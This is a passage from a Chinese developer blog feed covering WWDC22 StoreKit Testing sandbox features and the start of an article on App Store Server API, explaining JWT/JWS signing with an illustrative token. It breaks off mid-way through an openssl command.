环境测试则不会有通知。</p></blockquote><h2 id="5、沙盒测试环境的更新"><a href="#5、沙盒测试环境的更新" class="headerlink" title="5、沙盒测试环境的更新"></a>5、沙盒测试环境的更新</h2><p>在 iOS 12 之前沙盒账号测试内购买需要先登出 App Store 账号，在 iOS 12 开始，苹果才提供了单独的沙盒测试账号入口：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-23.png" alt="WWDC22-Xcode-StoreKit-Testing-23"></p><h3 id="5-1-沙盒-Apple-ID-创建"><a href="#5-1-沙盒-Apple-ID-创建" class="headerlink" title="5.1 沙盒 Apple ID 创建"></a>5.1 沙盒 Apple ID 创建</h3><p>开发人员可以更轻松地创建沙盒账号，相比以前少了 <code>安全提示问题</code>、<code>安全提示问题答案</code>、<code>出生日期</code> 三个选项。另外，密码强度不满足时会有提示语。</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-24.png" alt="WWDC22-Xcode-StoreKit-Testing-24"></p><h3 id="5-2-App-Store-Connect-API"><a href="#5-2-App-Store-Connect-API" class="headerlink" title="5.2 App Store Connect API"></a>5.2 App Store Connect API</h3><p>App Store Connect API 新支持：</p><ul><li>查询沙盒账号</li><li>清除沙盒账号的内购买历史记录</li><li>设置沙盒账号的购买中断状态</li></ul><h3 id="5-3-账单扣费失败模拟（Billing-failure-simulation）"><a href="#5-3-账单扣费失败模拟（Billing-failure-simulation）" class="headerlink" title="5.3 账单扣费失败模拟（Billing failure simulation）"></a>5.3 账单扣费失败模拟（Billing failure simulation）</h3><p>简单来说，沙盒测试账号中增加了 <code>Allow Purchase &amp; Renewals</code> 开关，用于测试订阅到期自动扣费和失败重试。</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-25.png" alt="WWDC22-Xcode-StoreKit-Testing-25"></p><p>比如当关闭这个按钮时，表示自动续订失败，订阅状态会进入扣费重试和宽限期中，此时就可以在沙盒环境中测试。</p><p>如果是 App Store Server Notifications V2 会收到 <code>DID_FAIL_TO_RENEW</code> <code>GRACE_PREIOD</code> 宽限期的通知：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-26.png" alt="WWDC22-Xcode-StoreKit-Testing-26"></p><p>开发者也可能通过 App Store Server API 主动查询订阅状态：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-27.png" alt="WWDC22-Xcode-StoreKit-Testing-27"></p><p>如果是 Original StoreKit API，则通过苹果票据验证接口获取状态：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-28.png" alt="WWDC22-Xcode-StoreKit-Testing-28"></p><h2 id="6、总结"><a href="#6、总结" class="headerlink" title="6、总结"></a>6、总结</h2><p>关于 StoreKit 和 In-App Purchase 测试，一般开发者会更加关注在 Sandbox（沙盒环境）下测试 App 内购买功能，因为这与 Production（生产环境）的区别最小，但是测试流程比较麻烦，需要开发者证书、沙盒测试账号登录等，开发者账号还必须成功绑定银行卡信息后才能调试内购买功能。如果是订阅类型的商品，还需要覆盖测试的场景非常多，测试起来更加的麻烦。</p><p>从上文的案例和代码示例可以知道，StoreKit Testing 借助 SwiftUI 和 StoreKit 2，让测试流程的实现技术更加自然。一方面是 SwiftUI 可以快速构建 UI 界面，更容易实现商品页面的展示和调整；另一方面 StoreKit 2 的 JWS transaction 票据不需要通过苹果的 StoreKit 服务器验证，更方便实现票据的校验流程。所以，对于新项目，或者使用 StoreKit 2 改造内购买逻辑流程时，使用 StoreKit Testing 将会大大提高代码测试的效率。</p><p>所以基于 Xcode 的 <a href="https://developer.apple.com/documentation/xcode/setting-up-storekit-testing-in-xcode">StoreKit Testing</a> 和 <a href="https://developer.apple.com/documentation/storekittest">StoreKitTest Framework</a> 框架，开发者有了更加高效的测试方式。而今年 WWDC22 改进后更加方便和高效，开发者无需关注证书配置和沙盒环境账号等，就能实现本地的内购买测试，对于需要验证某个商品购买逻辑完备性，或 App 新增加内购买功能时，只需要闭环本地的代码逻辑而无需验证票据等，StoreKit 本地测试会更加顺畅，建议读者可以尝试使用！</p><h2 id="7、参考链接"><a href="#7、参考链接" class="headerlink" title="7、参考链接"></a>7、参考链接</h2><ul><li><a href="https://developer.apple.com/videos/play/wwdc2022/10039/">What’s new in StoreKit testing - WWDC22</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2020/10659">Introducing StoreKit Testing in Xcode - WWDC20</a></li><li><a href="https://xiaozhuanlan.com/topic/1950472863">WWDC20 10659 - 介绍 Xcode 中的 StoreKit 测试 － 小专栏</a></li><li><a href="https://mp.weixin.qq.com/s/zzeFoUKA7jXcCaKtcgaiiQ">聚焦探索 In-App Purchase 新特性</a></li><li><a href="https://help.apple.com/app-store-connect/#/devc9870599e">管理自动续期订阅的定价 - App Store Connect 帮助</a></li><li><a href="https://developer.apple.com/cn/news/?id=tpgp89cl">订阅通知更新 - 最新动态 - Apple Developer</a></li><li><a href="https://developer.apple.com/documentation/swiftui/view/refundrequestsheet(for:ispresented:ondismiss:)">refundRequestSheet(for:isPresented:onDismiss:) | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/transaction/revocationreason">Transaction.RevocationReason | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/skpaymentqueue/3566726-presentcoderedemptionsheet">presentCodeRedemptionSheet() | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/swiftui/view/offercoderedemption(ispresented:oncompletion:)">offerCodeRedemption(isPresented:onCompletion:) | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/product/subscriptioninfo/status">Product.SubscriptionInfo.Status | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekittest">StoreKit Test | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/in-app_purchase/original_api_for_in-app_purchase/testing_in-app_purchases_in_xcode">Testing in-app purchases in Xcode | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/xcode/setting-up-storekit-testing-in-xcode">Setting Up StoreKit Testing in Xcode | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/in-app_purchase/testing_at_all_stages_of_development_with_xcode_and_sandbox">Testing at All Stages of Development with Xcode and Sandbox | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/in-app_purchase/testing_in-app_purchases_with_sandbox">Testing In-App Purchases with Sandbox | Apple Developer Documentation</a></li><li><a href="https://help.apple.com/app-store-connect/#/dev7e89e149d">测试 App 内购买项目 - App Store Connect 帮助</a></li><li><a href="https://developer.apple.com/cn/documentation/storekit/in-app_purchase/testing_in-app_purchases_with_sandbox/">使用沙盒测试 App 内购买项目 - Apple Developer</a></li><li><a href="https://help.apple.com/app-store-connect/#/dev6a098e4b1">为自动续期订阅设置优惠代码 - App Store Connect 帮助</a></li><li><a href="https://help.apple.com/app-store-connect/#/dev75708c031">提供自动续期订阅 - App Store Connect 帮助</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文是《WWDC22 内参》参与创作者，首发于 &lt;a href=&quot;https://xiaozhuanlan.com/topic/5842093617&quot;&gt;【WWDC22 10039】Xcode StoreKit 测试的新功能 － 小专栏&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;基于 &lt;a href=&quot;https://developer.apple.com/videos/play/wwdc2022/10039/&quot;&gt;Session 10039&lt;/a&gt; 梳理&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;作者：iHTCboy，目前就职于三七互娱37手游，从事游戏 SDK 开发多年，对 IAP 和 SDK 架构设计有丰富的实践经验。&lt;/p&gt;
&lt;p&gt;审核：&lt;br&gt;黄骋志（橙汁），老司机技术社区核心成员，现于西瓜视频负责稳定性 OOM/Watchdog 相关工作。&lt;/p&gt;
&lt;p&gt;SeaHub，目前任职于腾讯 TEG 计费平台部，负责搭建服务于腾讯系业务的支付组件 SDK，对 IAP 相关内容及 SDK 设计开发有一定的经验。&lt;/p&gt;
&lt;p&gt;王浙剑（Damonwong），老司机技术社区负责人、WWDC22 内参主理人，目前就职于阿里巴巴。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="Xcode" scheme="https://ihtcboy.com/tags/Xcode/"/>
    
    <category term="WWDC22" scheme="https://ihtcboy.com/tags/WWDC22/"/>
    
    <category term="StoreKit Testing" scheme="https://ihtcboy.com/tags/StoreKit-Testing/"/>
    
  </entry>
  
  <entry>
    <title>WWDC22 10040 - 探索 In-App Purchase 集成和迁移</title>
    <link href="https://ihtcboy.com/2022/06/15/2022-06-15_WWDC22-InAppPurchase%E9%9B%86%E6%88%90%E5%92%8C%E8%BF%81%E7%A7%BB/"/>
    <id>https://ihtcboy.com/2022/06/15/2022-06-15_WWDC22-InAppPurchase%E9%9B%86%E6%88%90%E5%92%8C%E8%BF%81%E7%A7%BB/</id>
    <published>2022-06-15T13:14:10.000Z</published>
    <updated>2022-12-31T15:05:31.140Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文是《WWDC22 内参》参与创作者，首发于 <a href="https://xiaozhuanlan.com/topic/8024563197">【WWDC22 10040】 探索 In-App Purchase 集成和迁移 － 小专栏</a>。</p></blockquote><p>基于 <a href="https://developer.apple.com/videos/play/wwdc2022/10040/">Session 10040</a> 梳理</p><blockquote><p>作者：iHTCboy，目前就职于三七互娱37手游，从事游戏 SDK 开发多年，对 IAP 和 SDK 架构设计有丰富的实践经验。</p><p>审核：<br>黄骋志（橙汁），老司机技术社区核心成员，现于西瓜视频负责稳定性 OOM/Watchdog 相关工作。</p><p>SeaHub，目前任职于腾讯 TEG 计费平台部，负责搭建服务于腾讯系业务的支付组件 SDK，对 IAP 相关内容及 SDK 设计开发有一定的经验。</p><p>王浙剑（Damonwong），老司机技术社区负责人、WWDC22 内参主理人，目前就职于阿里巴巴。</p></blockquote><span id="more"></span><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_0.png" alt="WWDC22_session_10040_0"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>苹果去年 WWDC21 推出了 StoreKit 2、App Store Server API 和 App Store Server Notifications V2，今年 WWDC22 基于这些功能的基础上，增加了一些新的 API 和一些服务的优化。另外，苹果针对这些新特性的疑虑进行了解答，例如 JWT/JWS、兼容性、安全性、订阅通知、服务端集成和迁移等等，最后提供了最佳实践的建议。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_1.png" alt="WWDC22_session_10040_1"></p><p>本文内容分成两个主题，分别是 App Store Server API 和 App Store Server Notifications，并结合去年和今年推出的新特性，进行深入浅出的探索。如果读者对去年 WWDC21 相关的内容还不太熟悉的话，推荐先阅读我们去年的文章：</p><ul><li><a href="https://mp.weixin.qq.com/s/arA0_uyc4CWMQ7WJ2RanJA">初见 StoreKit 2</a></li><li><a href="https://mp.weixin.qq.com/s/dWsRKRJsYMRl0GX_36T-kg">IAP 后台通信优化与实践</a></li><li><a href="https://mp.weixin.qq.com/s/MtytymgkcP3_oAH7JyI1og">IAP 用户退款与客诉处理优化</a></li></ul><p>开始之前，为帮助读者理解本文将提及的名词，我们一起梳理和回顾关于 In-App Purchase 的名词：</p><table><thead><tr><th>名词</th><th>功能</th><th>说明</th></tr></thead><tbody><tr><td><code>IAP</code> 或 <code>In-App Purchase</code></td><td>App 内购买项目，在所有 Apple 平台上，可以利用 IAP 支付系统，直接在您的 App 内提供额外的内容和功能，包括数字商品、订阅和增值内容等。</td><td>In-App Purchase 简写为 IAP 或者 <code>内购</code>，都是非苹果官方写法，但开发者普遍都接受，所以本文也将两者等同关系处理。</td></tr><tr><td><code>App Store Server API</code></td><td>WWDC21 推出的 REST API，它是一种强大、安全和高效的 Server to Server API，提供获取数据和执行操作的服务。</td><td>请求接口使用 JWT 验证，接口返回的信息使用 JSON Web Signature (JWS) 规范格式加密签名。</td></tr><tr><td><code>App Store Server Notifications V1</code> 和 <code>App Store Server Notifications V2</code></td><td>目前有 V1 和 V2 版本。通过来自 App Store 的服务器通知实时监控 IAP 事件。</td><td>V1 版本是 WWDC17 推出用于自动续期订阅的订阅状态变化通知，WWDC20 增加了退款通知，API 返回的内容是 JSON 格式。V2 版本是 WWDC 21 推出，API 返回的内容是 JSON Web Signature（JWS）规范格式加密签名，移除和新增部分通知类型，一些通知类型增加子类型（SubState）。</td></tr><tr><td><code>Original API for In-App Purchase</code> 或 <code>Original StoreKit</code></td><td>IAP 支付系统，原始的 StoreKit API，用于区分 StoreKit 2。</td><td>获取的交易票据叫 <code>App receipt</code>，需要通过 VerifyReceipt API 来解析票据内容。</td></tr><tr><td><code>StoreKit 2</code></td><td>WWDC21 推出的全新的基于 Swift 的 API，仅在 iOS15+ 生效。使用 Swift 的并发特性简化接口，并且使用 JWS 格式的交易票据。</td><td>获取的交易票据叫 <code>JWS transaction</code> 或 <code>Signed transaction</code>，开发者可独立进行验证，而无需通过苹果服务端 API 解码。另外需要注意，与 Original StoreKit 都是基于 StoreKit Framework 的 API，所以并不是叫 V2 版本。</td></tr><tr><td><code>originalTransactionId</code></td><td>IAP 交易成功时，App Store 生成的唯一交易标识符。此字段可通过 StoreKit API、App Store Server API 和 App Store Server Notifications 等方式获取。</td><td>自动续期订阅的项目使用此字段作为唯一标识，而续订成功的交易票据中 <code>transactionId</code> 会更新。另外部分的 App Store Server API 使用此字段作为请求参数。</td></tr></tbody></table><h2 id="App-Store-Server-API"><a href="#App-Store-Server-API" class="headerlink" title="App Store Server API"></a>App Store Server API</h2><p>首先，我们先来看看 App Store Server API 的变化，会从下面的四个方面进行阐述：</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_2.png" alt="WWDC22_session_10040_2"></p><ul><li>App Store Server API 的使用</li><li>探讨 JWT(JSON Web Tokens) 签名细节</li><li>校验签名的 transactions（交易）</li><li>从 StoreKit 的 verifyReceipt 迁移到 App Store Server API</li></ul><h3 id="App-Store-Server-API-的使用"><a href="#App-Store-Server-API-的使用" class="headerlink" title="App Store Server API 的使用"></a>App Store Server API 的使用</h3><h4 id="回顾-App-Store-Server-API"><a href="#回顾-App-Store-Server-API" class="headerlink" title="回顾 App Store Server API"></a>回顾 App Store Server API</h4><p>苹果去年 WWDC21 推出了 App Store Server API，<strong>这套接口兼容 Original StoreKit 和 StoreKit 2，开发者服务端可以直接使用，因为是新接口，所以无迁移或兼容的问题。</strong> 其中有 5 个 API 是通过 <code>originalTransactionId</code> 作为查询的参数，这个参数可以通过 receipts（票据）、signed transactions（签名的交易）、signed renewals（签名的续订信息）和 notifications（通知）等获取。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_3.png" alt="WWDC22_session_10040_3"></p><p>这几个接口解决了很多内购场景的问题，多年以来只能被动式接收苹果 IAP 流程的通知，导致开发者对 IAP 流程的处理总是不及时。比如自动续期订阅的续订，如果开发者接收苹果服务端通知异常，甚至用户不打开 App 的情况下，订阅到期后，用户是否有续订，开发者总是慢半拍，而现在通过 subscriptions API 开发者就可以实时用户查询订单状态，提升了订阅产品的用户体验。还有主动查询退款 refund lookup API，可以主动或定时检索用户的购买订单，及时发现恶意退款和异常购买，避免用户和开发者蒙受损失。</p><blockquote><p>以上接口的详细介绍，可参考我们之前的文章：<a href="https://mp.weixin.qq.com/s/MtytymgkcP3_oAH7JyI1og">IAP 用户退款与客诉处理优化</a>。</p></blockquote><p>去年还有一个 <code>lookup</code> API，这个接口根据用户提供的 <code>orderId</code> 来查询用户的每笔支付对应的开发者交易订单信息，从而让开发者更好地帮助用户解决问题。比如用户反馈充值成功但没有收到金币，这时候让用户提供苹果收据订单号 <code>orderId</code>，开发者就能查到此订单号对应的 <code>originalTransactionId</code> 交易标识，这样就能根据用户订单号关联开发者订单号的问题，从而解决以前无法根据用户的收据截图判断是否真实的支付成功的问题。</p><p>另外，今年新增了三个关于 App Store Server Notifications 的 API，在本文的后续章节会有简要的应用案例。如果读者想了解这部分的详细更新内容，可以参考 <a href="https://developer.apple.com/videos/play/wwdc2022/10007">What’s new with in-app purchase - WWDC22</a>。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_4.png" alt="WWDC22_session_10040_4"></p><h4 id="App-Store-Server-API-和-Original-StoreKit-结合使用"><a href="#App-Store-Server-API-和-Original-StoreKit-结合使用" class="headerlink" title="App Store Server API 和 Original StoreKit 结合使用"></a>App Store Server API 和 Original StoreKit 结合使用</h4><p>接下来讲解 App Store Server API 如何与开发者的服务器交互，正如前面说的，API 需要 <code>originalTransactionId</code> 作为查询的参数，具体可以怎么样获取？我们先来看 Original StoreKit 从哪里获取。</p><p>客户端将 Original StoreKit 获取的 <code>App receipt</code> 发送到开发者服务器，开发者服务器调用苹果的 <code>verifyReceipt</code> API 进行解析，根据苹果服务端返回的票据内容中的 in_app 、latest_receipt_info 和 pending_renewal_info 字段都包含 <code>originalTransactionId</code> 参数。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_5.png" alt="WWDC22_session_10040_5"></p><p>那么 Original StoreKit 怎么结合 App Store Server API 一起使用，原有的 <code>verifyReceipt</code> API 验证流程保持不变。具体的交互流程，首先是开发者 app 根据用户充值成功时获取的 App receipt 发给开发者服务器后，通过 <code>verifyReceipt</code> API 获取解码后的票据内容，然后通过 <code>originalTransactionId</code> 参数就可以调用 App Store Server API。对于原来的流程并没有影响，开发者可以通过 API 获取这个用户的交易或订阅信息，包括订阅续订详细信息等。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_6.png" alt="WWDC22_session_10040_6"></p><h4 id="App-Store-Server-API-和-StoreKit-2-结合使用"><a href="#App-Store-Server-API-和-StoreKit-2-结合使用" class="headerlink" title="App Store Server API 和 StoreKit 2 结合使用"></a>App Store Server API 和 StoreKit 2 结合使用</h4><p>StoreKit 2 获取 <code>originalTransactionId</code> 通过新 API <code>transaction.originalID</code> 获取，但需要注意只支持 iOS 15 或更高的系统版本。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_7.png" alt="WWDC22_session_10040_7"></p><p>当然也可以通过服务端获取，例如客户端提供的签名的 JWS transaction 的解析，或者是调用 App Store Server API 或 App Store Server Notifications 回调等等。例如 JWS transaction 中的 Payload 中就有 originalTransactionId 字段：<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_8.png" alt="WWDC22_session_10040_8"></p><p>StoreKit 2 使用 App Store Server API 更加简单，因为不需要调用 <code>verifyReceipt</code> API，所以直接调用 App Store Server API 就可以。与 Original StoreKit 一样不影响开发者服务端现有的票据验证流程。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_9.png" alt="WWDC22_session_10040_9"></p><p>最后，我们总结一下在 Original StoreKit 和 StoreKit 2 中使用 App Store Server API 的流程。首先 App Store Server API 支持 Original StoreKit 和 StoreKit 2，并且不需要依赖其它的接口，只需要 <code>originalTransactionId</code> 参数。而这个参数在 Original StoreKit 的  App receipts 中可获取，在 StoreKit 2 中的 Signed transactions 中可获取。所以，App Store Server API 的使用就是这么简单。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_10.png" alt="WWDC22_session_10040_10"></p><p>这里还想重点提醒一下，使用 Original StoreKit 的开发者服务器，以前从票据（App receipt）中解析 <code>latest_receipt</code> 来获取订阅的最新状态，而现在可以通过 <code>originalTransactionId</code> 请求 <code>Get All Subscription Statuses</code> API 获取相应订阅的最新状态，相比以前通过客户端刷新或者等待苹果服务器推送通知的方式，更加灵活和高效。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_11.png" alt="WWDC22_session_10040_11"></p><p>以上就是将 App Store Server API 与 Original StoreKit 和 StoreKit 2 一起结合使用的案例。接下来，我们一起看看怎么调用 App Store Server API。</p><h3 id="探讨-JWT-签名细节"><a href="#探讨-JWT-签名细节" class="headerlink" title="探讨 JWT 签名细节"></a>探讨 JWT 签名细节</h3><h4 id="JWT-的优势"><a href="#JWT-的优势" class="headerlink" title="JWT 的优势"></a>JWT 的优势</h4><p>App Store Server API 为什么使用 JWT(JSON Web Tokens) 作为身份验证参数呢？</p><p>其实 JWT 是目前最流行的跨域认证解决方案，什么是跨域认证呢？如今的互联网服务都离不开用户认证，在解答这些问题之前，我们先来看看实现一个用户认证的流程：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、用户向服务器发送用户名和密码。</span><br><span class="line">2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。</span><br><span class="line">3、服务器向用户返回一个 session<span class="emphasis">_id，写入用户的 Cookie。</span></span><br><span class="line"><span class="emphasis">4、用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。</span></span><br><span class="line"><span class="emphasis">5、服务器收到 session_</span>id，找到前期保存的数据，由此得知用户的身份。</span><br></pre></td></tr></table></figure><p>这种流程存在什么问题？扩展性不好，无法适应现在的服务端架构。如果只是单台服务器是没有问题，但如果是服务器集群，或者是跨域的服务器架构，就要求 session 数据共享，每台服务器都能够读取 session。</p><p>session 在多个服务器之间共享就是最大的问题，服务器间要做到实时共享 session，另外不同业务的服务器可能 session 逻辑不一样，可能无法做到共享。所以另一种方案是服务器索性不保存 session 数据，所有数据都保存在客户端，每次请求都发回服务器。JWT 就是这种方案的一个代表。</p><h4 id="JWT-的原理"><a href="#JWT-的原理" class="headerlink" title="JWT 的原理"></a>JWT 的原理</h4><p>JWT 是一个开放式标准（规范文件 <a href="https://datatracker.ietf.org/doc/html/rfc7519">RFC 7519</a>），用于网络主机之间以 JSON 对象安全传输信息。而 JWS 是其中的一种实现规范（规范文件 <a href="https://datatracker.ietf.org/doc/html/rfc7515">RFC 7515</a>），表示签名过的 JWT。也就是说，可以通过 JWS 验证信息是否被篡改，用于验证内容的真实性。</p><p>JWT 由三部分组成，通过点号 <code>.</code> 进行分割。每个部分都是经过 Base64Url 编码的字符串。第一部分 (Header) 和第二部分 (Payload) 在解码后应该是有效的 JSON，最后一部分 (签名) 是通过指定的算法得到在前两部分上所得到的签名数据。</p><p>JWT 格式：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">base64</span>(<span class="variable">header</span>) + <span class="string">&#x27;.&#x27;</span> + <span class="title">base64</span>(<span class="variable">payload</span>) + <span class="string">&#x27;.&#x27;</span> + <span class="title">sign</span>( <span class="title">Base64</span>(<span class="variable">header</span>) + <span class="string">&quot;.&quot;</span> + <span class="title">Base64</span>(<span class="variable">payload</span>) )</span></span><br></pre></td></tr></table></figure><p>这样说可能比较抽象，我们举一个例子来说，假设我们需要创建一个身份认证的 JWT 字符串：</p><p>header 内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload 内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;姓名&quot;</span>: <span class="string">&quot;iHTCboy&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;角色&quot;</span>: <span class="string">&quot;管理员&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;到期时间&quot;</span>: <span class="string">&quot;2022年6月30日0点0分&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为 header 算法是 <code>HS256</code>，所以假设 secret 设置为 123456，则可以得到最终的 JWT 编码后的字符串：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.eyLlp<span class="number">5</span>PlkI<span class="number">0</span>iOiJpSFRDYm<span class="number">95</span>Iiwi<span class="number">6</span>KeS<span class="number">6</span>ImyIjoi<span class="number">566</span>h<span class="number">55</span>CG<span class="number">5</span>ZGYIiwi<span class="number">5</span>Yiw<span class="number">5</span>pyf<span class="number">5</span>pe<span class="number">26</span>Ze<span class="number">0</span>IjoiMjAyMuW<span class="number">5</span>tDbmnIgzMOaXpTDngrkw<span class="number">5</span>YiGIn<span class="number">0</span>.vZhFBP<span class="number">0</span>EIP<span class="number">2</span>pE<span class="number">29</span>X_<span class="number">7</span>G_<span class="number">1</span>dM<span class="number">7</span>JflIRFouJcXjjo_BAnM</span><br></pre></td></tr></table></figure><p>具体要怎么验证 JWT 是否合法，开发者可以根据 JWT 的规范自行解析，也可以使用验证 JWS 的第三方库，可参考 jwt.io 网站的 <a href="https://jwt.io/libraries">JSON Web Token Libraries</a>，也可以使用 <a href="https://jwt.io/">jwt.io</a> 在线网站进行验证：</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_12.png" alt="WWDC22_session_10040_12"></p><p>但是 HS256 算法加上一个密钥即可，这种方式严格依赖密钥，但在分布式场景，可能多个服务都需要验证 JWT，若要在每个服务里面都保存密钥，那么安全性将会大打折扣，如果密钥一旦泄露，任何人都可以随意伪造 JWT。所以，应该怎么保证呢？</p><p>JWT 的原理现在读者应该了解基本知识了，保证数据未被篡改，JWS 核心就是签名，而检查签名的过程就叫做验证。更通俗的理解，就是对应前面提到的 JWT 的第三部分 Signature，如何保证数据不被篡改，那么就需要使用数字签名，它保证只有信息的发送者才能产生的别人无法伪造的一段数字串，一般是非对称密钥加密技术与数字摘要技术的结合应用，目前在数字签名中使用的三种非对称算法有 <code>RSA</code>、<code>DSA</code> 和 <code>ECDSA</code>。</p><blockquote><p>严格来说，JWT 有两种实现，分别是 JWS (JSON Web Signature) 和 JWE (JSON Web Encryption)。由于 JWS 的应用更为广泛，所以一般说起 JWT 大家默认会认为是 JWS。JWS 的 Payload 是 Base64Url 的明文，而 JWE 的数据则是经过加密的。相对地，相比于 JWS 的三个部分，JWE 有五个部分组成。JWT 还有很多值得探讨的内容，本文只能简单介绍原理，读者可以参考阅读 <a href="https://jishuin.proginn.com/p/763bfbd6c8bc">引用 1</a>、<a href="https://onevcat.com/2018/12/jose-1/">引用 2</a>。</p></blockquote><h4 id="App-Store-Server-API-的-JWT-使用"><a href="#App-Store-Server-API-的-JWT-使用" class="headerlink" title="App Store Server API 的 JWT 使用"></a>App Store Server API 的 JWT 使用</h4><p>接下来我们讲解 JWT 的使用细节，JWT 是调用 App Store Server API 必须生成的签名参数。App Store Server API 使用的前提条件：</p><ul><li>调用 App Store Server API 时必须验证你的合法身份，通过 JWT 来验证</li><li>每次请求 API 需要包含这个 JWT 的请求头信息</li><li>JWT 由 header（签名头）、payload（有效负载）和 signature（签名）组成</li></ul><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_13.png" alt="WWDC22_session_10040_13"><br>具体来说，JWT 签名分为三个部分，用句点分隔，Base64 编码的 header（签名头）、 Base64 编码的 payload（有效负载）和 signature（签名）组成，最后的签名部分，根据 header 定义的签名算法和类型进行签名。</p><p>具体 JWT 字段的含义：</p><table><thead><tr><th>字段</th><th align="left">含义</th><th>字段值说明</th></tr></thead><tbody><tr><td>alg</td><td align="left">Encryption Algorithm，加密算法</td><td>默认值：ES256。App Store Server API 的所有 JWT 都必须使用 ES256 加密进行签名。</td></tr><tr><td>kid</td><td align="left">Key ID，密钥 ID</td><td>您的私钥 ID，值来自 App Store Connect 的内购密钥页面。</td></tr><tr><td>type</td><td align="left">Token Type，令牌类型</td><td>默认值：JWT</td></tr><tr><td>iss</td><td align="left">Issuer，发行人</td><td>您的发卡机构 ID，值来自 App Store Connect 的 API 密钥页面。</td></tr><tr><td>iat</td><td align="left">Issued At，发布时间</td><td>秒，以 UNIX 时间（例如：1623085200）发布令牌的时间</td></tr><tr><td>exp</td><td align="left">Expiration Time，到期时间</td><td>秒，令牌的到期时间，以 UNIX 时间为单位。在 iat 中超过 60 分钟过期的令牌无效（例如：1623086400）</td></tr><tr><td>aud</td><td align="left">Audience，受众</td><td>固定值：appstoreconnect-v1</td></tr><tr><td>bid</td><td align="left">Bundle ID，套装 ID</td><td>您的 app 的套装 ID，即 app 包名</td></tr></tbody></table><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_14.png" alt="WWDC22_session_10040_14"></p><p>生成 JWT 还需要生成一个私钥文件，可以参考苹果文档 <a href="https://developer.apple.com/documentation/appstoreserverapi/creating_api_keys_to_use_with_the_app_store_server_api">Creating API Keys to Use With the App Store Server API</a>。一般生成 JWT token 我们会通过第三方库来生成，可以参考 <a href="https://jwt.io/libraries">JSON Web Token Libraries</a>。具体请求可参考上图的 <code>curl</code> 命令示例，替换 <code>$&#123;token&#125;</code> 和 <code>$&#123;originalTransactionId&#125;</code> 就可以。</p><p>关于 App Store Server API 苹果怎么验证我们的生成的这个 JWT token 是否可信呢？我们在苹果后台生成 <code>.p8</code> 格式的私钥文件，苹果服务器保存了公钥文件，当我们请求 App Store Server API 时，苹果根据公钥文件就可以验证 JWT 是否可信。当然开发者也可以自己验证，首先执行下面命令，把  <code>.p8</code> 私钥文件导出公钥文件：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">openssl</span> ec -in 